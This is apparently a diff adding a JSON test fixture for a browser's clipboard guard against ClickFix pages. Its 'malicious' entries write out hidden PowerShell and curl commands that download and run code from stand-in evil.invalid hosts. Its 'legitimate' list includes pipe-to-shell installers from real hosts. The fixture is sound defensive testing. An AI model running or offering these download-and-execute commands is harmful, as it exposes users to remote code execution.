@@ -1,0 +1,104 @@
+{
+  "_comment": "ClickFix smoke scenarios. Each is driven by clipguard_test.py against a built Whisper over Marionette, with the pages served from two loopback origins (no network). trigger: click (synthesize a click in the page), ctrlc (click then Ctrl+C). expectClipboard: placeholder = Whisper's blocked-copy placeholder; command = the real command text; prose = the visible text. pageSaw: success = the page's writeText/execCommand reported success (the page must not learn the decision). Addresses are *.invalid or RFC 5737; nothing is executed.",
+  "malicious": [
+    {
+      "page": "click_writetext.html",
+      "trigger": "click",
+      "command": "powershell -w hidden -c \"iwr https://evil.invalid/a.ps1 | iex\"",
+      "expectClipboard": "placeholder",
+      "pageSaw": "success"
+    },
+    {
+      "page": "click_writeitem.html",
+      "trigger": "click",
+      "command": "irm https://evil.invalid/x | iex",
+      "expectClipboard": "placeholder",
+      "pageSaw": "success"
+    },
+    {
+      "page": "hidden_textarea_exec.html",
+      "trigger": "click",
+      "command": "curl -s https://evil.invalid/a | sh",
+      "expectClipboard": "placeholder",
+      "pageSaw": "success"
+    },
+    {
+      "page": "copy_handler_ctrlc.html",
+      "trigger": "ctrlc",
+      "command": "powershell -w hidden -c \"iwr https://evil.invalid/b | iex\"",
+      "expectClipboard": "placeholder",
+      "pageSaw": "success"
+    },
+    {
+      "page": "filefix_indent.html",
+      "trigger": "click",
+      "expectClipboard": "placeholder",
+      "pageSaw": "success"
+    },
+    {
+      "page": "invisible_esc.html",
+      "trigger": "click",
+      "expectClipboard": "placeholder",
+      "pageSaw": "success"
+    },
+    {
+      "page": "lookalike.html",
+      "trigger": "click",
+      "expectClipboard": "placeholder",
+      "pageSaw": "success"
+    },
+    {
+      "page": "cross_origin_iframe.html",
+      "trigger": "click",
+      "command": "powershell -w hidden -c \"iwr https://evil.invalid/c | iex\"",
+      "expectClipboard": "placeholder",
+      "pageSaw": "success",
+      "resultFrame": "child"
+    },
+    {
+      "page": "readback_probe.html",
+      "trigger": "click",
+      "command": "iex (iwr https://evil.invalid/p.txt -UseBasicParsing)",
+      "expectClipboard": "placeholder",
+      "pageSaw": "success",
+      "expectReadNotCommand": true
+    }
+  ],
+  "legitimate": [
+    {
+      "page": "legit_github_button.html",
+      "trigger": "click",
+      "command": "curl -fsSL https://bun.sh/install | bash",
+      "expectClipboard": "command",
+      "pageSaw": "success"
+    },
+    {
+      "page": "legit_docs_snippet.html",
+      "trigger": "click",
+      "command": "curl --proto \"=https\" --tlsv1.2 -sSf https://sh.rustup.rs | sh",
+      "expectClipboard": "command",
+      "pageSaw": "success"
+    },
+    {
+      "page": "legit_plain_ctrlc.html",
+      "trigger": "ctrlc",
+      "command": "git clone https://github.com/footprintsntrails/whisper-browser.git",
+      "expectClipboard": "command",
+      "pageSaw": "success"
+    },
+    {
+      "page": "legit_unknown_installer.html",
+      "trigger": "click",
+      "command": "irm https://get.activated.win | iex",
+      "expectClipboard": "command",
+      "pageSaw": "success"
+    },
+    {
+      "page": "legit_prose.html",
+      "trigger": "click",
+      "command": "Hello, world! This is ordinary text copied from a blog post.",
+      "expectClipboard": "command",
+      "pageSaw": "success"
+    }
+  ]
+}
